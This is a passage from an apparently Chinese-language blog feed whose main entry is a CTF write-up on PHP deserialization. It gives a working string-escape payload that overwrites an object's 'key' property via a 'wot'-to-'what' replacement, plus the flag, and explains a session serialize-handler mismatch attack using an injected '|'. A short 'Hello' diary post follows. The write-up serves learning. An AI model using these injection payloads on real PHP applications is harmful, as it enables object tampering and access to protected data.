class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">考的是序列化里面的变量覆盖</span><br><span class="line">序列化实际上是按照一定规则把类里面的变量保存成字符串</span><br><span class="line">反序列化则是按照这个规则反向从字符串中解析出变量</span><br><span class="line">但问题在于反序列化只是一种单纯的数据类型转换方式,</span><br><span class="line">转换的结果完全在于反序列化的字符串里面的字符内容</span><br><span class="line">所以我们完全可以按照序列化的规则自己构造出包含任意值字符串对正常序列化后的字符串拼接,替换</span><br><span class="line">(这套规则可以参考https://www.cnblogs.com/webu/archive/2013/01/28/2879383.html)</span><br><span class="line">反序列时仍然能够正常解析为我们涉及的值,如</span><br><span class="line">class <span class="built_in">test</span>&#123;</span><br><span class="line"><span class="variable">$test</span>=<span class="string">&quot;hi&quot;</span>;&#125;</span><br><span class="line">序列化的结果是字符串</span><br><span class="line">O:4:<span class="string">&quot;test&quot;</span>:1:&#123;s:4:<span class="string">&quot;test&quot;</span>;s:2:<span class="string">&quot;hi&quot;</span>;&#125;</span><br><span class="line">按照序列化的规则我们完全新增一个值为字符串<span class="string">&quot;123&quot;</span>的变量a,只需要对上述字符串进行小小的修改,如</span><br><span class="line">O:4:<span class="string">&quot;test&quot;</span>:2:&#123;s:4:<span class="string">&quot;test&quot;</span>;s:2:<span class="string">&quot;hi&quot;</span>;s:1:<span class="string">&quot;a&quot;</span>;s:3:<span class="string">&quot;123&quot;</span>;&#125;</span><br><span class="line">反序列后得到的类也就对应多了一个值为字符串<span class="string">&quot;123&quot;</span>的变量a</span><br><span class="line">本题的考点实际上也就是类似于这种操作</span><br><span class="line">人为的修改序列化后得的字符串,使得extract类中的key属性值发生变化</span><br><span class="line">具体操作在解答部分中解释</span><br><span class="line">[解答]</span><br><span class="line">先给出payload</span><br><span class="line">?value=wotwotwotwotwotwotwotwotwotwotwotwotwotwotwotwotwotwotwotwotwotwotwotwotwotwotwotwotwotwotwotwotwotwotwotwotwot<span class="string">&quot;;s:3:&quot;</span>key<span class="string">&quot;;s:16:&quot;</span>this_is_a_secret<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">本题和介绍中描述情况的差别是,我们输入的所有内容只会赋值为extract类的arg属性的值</span></span><br><span class="line"><span class="string">我们并不存在对extract类序列化,或者反序列化结果的直接掌控</span></span><br><span class="line"><span class="string">可控点在于str_replace(&#x27;wot&#x27;,&#x27;what&#x27;,serialize(<span class="variable">$cls</span>))此处代码</span></span><br><span class="line"><span class="string">将序列化后字符串中的所有wot替换为what</span></span><br><span class="line"><span class="string">需要注意的是,序列化时已经按照规则固定好了各部分的长度和内容</span></span><br><span class="line"><span class="string">像这样强行替换值可能会导致错误(也就是本题的利用点),以介绍中的test类为例</span></span><br><span class="line"><span class="string">假设正常序列化结果为</span></span><br><span class="line"><span class="string">O:4:&quot;</span><span class="built_in">test</span><span class="string">&quot;:1:&#123;s:4:&quot;</span><span class="built_in">test</span><span class="string">&quot;;s:3:&quot;</span>wot<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">经过替换变成了</span></span><br><span class="line"><span class="string">O:4:&quot;</span><span class="built_in">test</span><span class="string">&quot;:1:&#123;s:4:&quot;</span><span class="built_in">test</span><span class="string">&quot;;s:3:&quot;</span>what<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">反序列化时按照规则s:2:&quot;</span>what<span class="string">&quot;;这一段前面的s:2实际上规定了</span></span><br><span class="line"><span class="string">后面数值为字符型,长度为3,但替换后变成what,明显长度为4,前后矛盾,这个时候就会解析失败</span></span><br><span class="line"><span class="string">但如果将test类的test属性的值改变一下呢?如</span></span><br><span class="line"><span class="string">O:4:&quot;</span><span class="built_in">test</span><span class="string">&quot;:1:&#123;s:4:&quot;</span><span class="built_in">test</span><span class="string">&quot;;s:12:&quot;</span>wotwotwot<span class="string">&quot;;&#125;&quot;</span>;&#125;</span><br><span class="line">这时的<span class="built_in">test</span>属性的值为一个长度为12的字符串wotwotwot<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">接着进行了替换变成了</span></span><br><span class="line"><span class="string">O:4:&quot;</span><span class="built_in">test</span><span class="string">&quot;:1:&#123;s:4:&quot;</span><span class="built_in">test</span><span class="string">&quot;;s:12:&quot;</span>whatwhatwhat<span class="string">&quot;;&#125;&quot;</span>;&#125;</span><br><span class="line">可以发现,替换后wotwotwot变成了whatwhatwhat,仔细数一数会发现</span><br><span class="line">whatwhatwhat的长度就已经为12,</span><br><span class="line">这时再按照反序列化规则来解析,<span class="built_in">test</span>类的<span class="built_in">test</span>变量的值就为whatwhatwhat,</span><br><span class="line">原本的wotwotwot<span class="string">&quot;;&#125;由于wot=&gt;what这种格式的替换</span></span><br><span class="line"><span class="string">整体长度整整多了3,这就导致了反序列化解析式时获取的test属性的值少了最后&quot;</span>;&#125;这三个字符</span><br><span class="line">而这三个符号<span class="string">&quot;;&#125;刚好又是特殊符号与前面的部分形成了闭合保证了能够被正常解析,</span></span><br><span class="line"><span class="string">此时我们可以把这个替换后的结构分开来看一看</span></span><br><span class="line"><span class="string">O:4:&quot;</span><span class="built_in">test</span><span class="string">&quot;:1:&#123;s:4:&quot;</span><span class="built_in">test</span><span class="string">&quot;;s:12:&quot;</span>whatwhatwhat<span class="string">&quot;;&#125;&quot;</span>;&#125;</span><br><span class="line">很显然,前面部分就按照解析规则已经可以被正常的解析为一个类了,PHP解析到此也就停止</span><br><span class="line">后面部分的<span class="string">&quot;;&#125;省去</span></span><br><span class="line"><span class="string">回到本题上来,也是同样的方法</span></span><br><span class="line"><span class="string">我们先列出来,如果extract类中的key属性值为所需值时序列化结果(假设传入令var值为a)</span></span><br><span class="line"><span class="string">O:7:&quot;</span>extract<span class="string">&quot;:2:&#123;s:3:&quot;</span>var<span class="string">&quot;;s:1:&quot;</span>a<span class="string">&quot;;s:3:&quot;</span>key<span class="string">&quot;;s:16:&quot;</span>this_is_a_secret<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">但实际题目中我们获得的序列化结果是</span></span><br><span class="line"><span class="string">O:7:&quot;</span>extract<span class="string">&quot;:2:&#123;s:3:&quot;</span>var<span class="string">&quot;;s:1:&quot;</span>a<span class="string">&quot;;s:3:&quot;</span>key<span class="string">&quot;;s:20:&quot;</span>this_is_not_a_secret<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">按照上述同理,我们可以让var属性的值以&quot;</span>;s:3:<span class="string">&quot;key&quot;</span>;s:16:<span class="string">&quot;this_is_a_secret&quot;</span>;&#125;这部分结尾(这部分37个字符)</span><br><span class="line">以一定数量的(37个)wot开头,这样由于随后的wot=&gt;what替换</span><br><span class="line">结尾的部分便被<span class="string">&quot;挤出去&quot;</span>了,随后按照反序列化规则的解析,</span><br><span class="line">反序列化结果中key属性值便是this_is_a_secret也就拿到flag了</span><br><span class="line">[flag]</span><br><span class="line">flag&#123;ez_Var1abl2_c0verAg2&#125;</span><br></pre></td></tr></table></figure><h4 id="session反序列化攻击："><a href="#session反序列化攻击：" class="headerlink" title="session反序列化攻击："></a>session反序列化攻击：</h4><h5 id="先来了解一下什么是session"><a href="#先来了解一下什么是session" class="headerlink" title="先来了解一下什么是session:"></a>先来了解一下什么是session:</h5><p>在计算机中，尤其是在网络应用中，称为“会话控制”。<strong>Session 对象存储特定用户会话所需的属性及配置信息。</strong>这样，<strong>当用户在应用程序的 Web 页之间跳转时，存储在 Session 对象中的变量将不会丢失，而是在整个用户会话中一直存在下去。</strong>当用户请求来自应用程序的 Web 页时，如果该用户还没有会话，则 Web 服务器将自动创建一个 Session 对象。当会话过期或被放弃后，服务器将终止该会话。</p><h5 id="session是如何起作用的："><a href="#session是如何起作用的：" class="headerlink" title="session是如何起作用的："></a>session是如何起作用的：</h5><p>当第一次访问网站时，Seesion_start()函数就会创建一个唯一的Session ID，并自动通过HTTP的响应头，将这个Session ID保存到客户端Cookie中。同时，也在服务器端创建一个以Session ID命名的文件，用于保存这个用户的会话信息。当同一个用户再次访问这个网站时，也会自动通过HTTP的请求头将Cookie中保存的Seesion ID再携带过来，这时Session_start()函数就不会再去分配一个新的Session ID，而是在服务器的硬盘中去寻找和这个Session ID同名的Session文件，将这之前为这个用户保存的会话信息读出，在当前脚本中应用，达到跟踪这个用户的目的。</p><h5 id="session-start函数的作用："><a href="#session-start函数的作用：" class="headerlink" title="session_start函数的作用："></a>session_start函数的作用：</h5><p>当会话自动开始或者通过 session_start() 手动开始的时候， PHP 内部会依据客户端传来的PHPSESSID来获取现有的对应的会话数据（即session文件）， <strong>PHP 会自动反序列化session文件的内容</strong>，<strong>并将之填充到 $_SESSION 超级全局变量中</strong>。如果不存在对应的会话数据，则创建名为sess_PHPSESSID(客户端传来的)的文件。<strong>如果客户端未发送PHPSESSID，则创建一个由32个字母组成的PHPSESSID，并返回set-cookie。</strong></p><h5 id="想要知道为什么为出现这个session漏洞，就需要了解session机制中对序列化是如何处理的："><a href="#想要知道为什么为出现这个session漏洞，就需要了解session机制中对序列化是如何处理的：" class="headerlink" title="想要知道为什么为出现这个session漏洞，就需要了解session机制中对序列化是如何处理的："></a>想要知道为什么为出现这个session漏洞，就需要了解session机制中对序列化是如何处理的：</h5><p><img src="/2021/11/17/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211015214433147.png" alt="image-20211015214433147"></p><p>这个便是在相应的处理器处理下，<code>session</code>所存储的格式，这里举个例子来了解一下在不同的处理器下，session所储存的格式有什么不一样：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="comment">//ini_set(&quot;session.serialize_handler&quot;, &quot;php_serialize&quot;);</span></span><br><span class="line"><span class="comment">//ini_set(&quot;session.serialize_handler&quot;, &quot;php_binary&quot;);</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;lemon&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">var_dump(<span class="variable">$_SESSION</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出为：</span></span><br><span class="line">php : lemon|s:<span class="number">3</span>:<span class="string">&quot;shy&quot;</span>;</span><br><span class="line">php_serialize : a:<span class="number">1</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;lemon&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;shy&quot;</span>;&#125;</span><br><span class="line">php_binary : lemons:<span class="number">3</span>:<span class="string">&quot;shy&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>其实PHP中的Session的实现是没有的问题，危害主要是由于程序员的Session使用不当而引起的。如：使用不同引擎来处理session文件。</strong></p><h5 id="使用不同的引擎来处理session文件-session反序列化漏洞）"><a href="#使用不同的引擎来处理session文件-session反序列化漏洞）" class="headerlink" title="使用不同的引擎来处理session文件(session反序列化漏洞）:"></a>使用不同的引擎来处理session文件(session反序列化漏洞）:</h5><p>php引擎的存储格式是<code>键名 | serialized_string</code>，而php_serialize引擎的存储格式是<code>serialized_string</code>。<strong>如果程序使用两个引擎来分别处理的话就会出现问题。</strong></p><p><strong>(1.php)</strong></p><p>先以<code>php_serialize</code>的格式存储，从客户端接收参数并存入<code>session</code>变量</p><p><img src="/2021/11/17/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211015214940789.png" alt="image-20211015214940789"></p><p><strong>(2.php)</strong></p><p>接下来使用<code>php</code>引擎读取session文件</p><p><img src="/2021/11/17/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211015215007817.png" alt="image-20211015215007817"></p><h4 id="攻击思路："><a href="#攻击思路：" class="headerlink" title="攻击思路："></a>攻击思路：</h4><p>首先访问1.php，<strong>在传入的参数最开始加一个’|’<strong>，由于</strong>1.php是使用php_serialize引擎处理，因此只会把’|’当做一个正常的字符。</strong>然后访问2.php，由于用的是<strong>php引擎，因此遇到’|’时会将之看做键名与值的分割符，从而造成了歧义，导致其在解析session文件时直接对’|’后的值进行反序列化处理。</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;序列化与反序列化&quot;&gt;&lt;a href=&quot;#序列化与反序列化&quot; class=&quot;headerlink&quot; title=&quot;序列化与反序列化&quot;&gt;&lt;/a&gt;序列化与反序列化&lt;/h2&gt;&lt;h4 id=&quot;序列化函数：serialize：&quot;&gt;&lt;a href=&quot;#序列化函数：seriali</summary>
      
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    
    <category term="发序列化" scheme="http://example.com/tags/%E5%8F%91%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Hello</title>
    <link href="http://example.com/2021/11/17/hello/"/>
    <id>http://example.com/2021/11/17/hello/</id>
    <published>2021-11-17T02:26:12.000Z</published>
    <updated>2021-11-17T15:34:45.669Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Day1"><a href="#Day1" class="headerlink" title="Day1"></a>Day1</h2><p>hello，这是我的第一篇博客,以后这里会记录我的日常生活和学习!</p><p>大概更新的学习内容会有CTF，python，Java的相关知识，期待您的来访~</p><img src="/2021/11/17/hello/1.jpg" alt="相对路径图片" style="zoom:55%;">]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Day1&quot;&gt;&lt;a href=&quot;#Day1&quot; class=&quot;headerlink&quot; title=&quot;Day1&quot;&gt;&lt;/a&gt;Day1&lt;/h2&gt;&lt;p&gt;hello，这是我的第一篇博客,以后这里会记录我的日常生活和学习!&lt;/p&gt;
&lt;p&gt;大概更新的学习内容会有CTF，python</summary>
      
    
    
    
    <category term="Diary" scheme="http://example.com/categories/Diary/"/>
    
    
    <category term="Day1" scheme="http://example.com/tags/Day1/"/>
    
  </entry>
  
</feed>
